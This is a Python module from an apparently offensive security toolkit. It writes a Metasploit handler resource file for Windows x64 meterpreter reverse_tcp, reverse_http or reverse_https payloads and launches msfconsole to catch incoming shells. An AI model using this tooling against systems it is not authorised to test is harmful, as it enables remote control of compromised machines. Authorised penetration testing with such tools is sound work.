import subprocess
from pathlib import Path

from core.attacker import resolve_lhost
from core.paths import get_artifacts_dir

G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
W = "\033[0m"
BOLD = "\033[1m"


PAYLOADS = {
    "1": "windows/x64/meterpreter/reverse_tcp",
    "2": "windows/x64/meterpreter/reverse_http",
    "3": "windows/x64/meterpreter/reverse_https",
}


def run(data, cred, args):

    #
    # ---------------------------------------------------------
    # Payload
    # ---------------------------------------------------------
    #

    payload = None
    lhost = None
    lport = None

    if args.extra:

        payload = args.extra[0]

        if len(args.extra) >= 2:
            lhost = args.extra[1]

        if len(args.extra) >= 3:
            lport = args.extra[2]

    else:

        print()

        print(
            f"{B}┌── METERPRETER HANDLER ───────────────────┐{W}"
        )

        print(
            f"  {B}[1]{W} reverse_tcp"
        )

        print(
            f"  {B}[2]{W} reverse_http"
        )

        print(
            f"  {B}[3]{W} reverse_https\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice not in PAYLOADS:
            return

        payload = PAYLOADS[choice]

    #
    # ---------------------------------------------------------
    # Callback
    # ---------------------------------------------------------
    #

    if not lhost:

        default = resolve_lhost(
            args=args
        )

        lhost = input(
            f"{Y}LHOST [{default}]> {W}"
        ).strip()

        if not lhost:
            lhost = default

    if not lport:

        lport = input(
            f"{Y}LPORT [4444]> {W}"
        ).strip()

        if not lport:
            lport = "4444"


    #
    # ---------------------------------------------------------
    # Bind
    # ---------------------------------------------------------
    #

    bind_ip = "0.0.0.0"

    #
    # ---------------------------------------------------------
    # RC FILE
    # ---------------------------------------------------------
    #

    rc = (
        get_artifacts_dir(
            "handler"
        )
        /
        "handler.rc"
    )

    rc.parent.mkdir(
        parents=True,
        exist_ok=True,
    )

    rc.write_text(
f"""use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set ExitOnSession false
exploit -j
sessions -l
"""
    )

    print()

    print(
        f"{G}[+] RC file:{W}"
    )

    print(
        f"  {C}{rc}{W}\n"
    )

    print(
        f"{G}[+] Launching Metasploit...{W}\n"
    )

    subprocess.run([
        "msfconsole",
        "-q",
        "-r",
        str(rc),
    ])
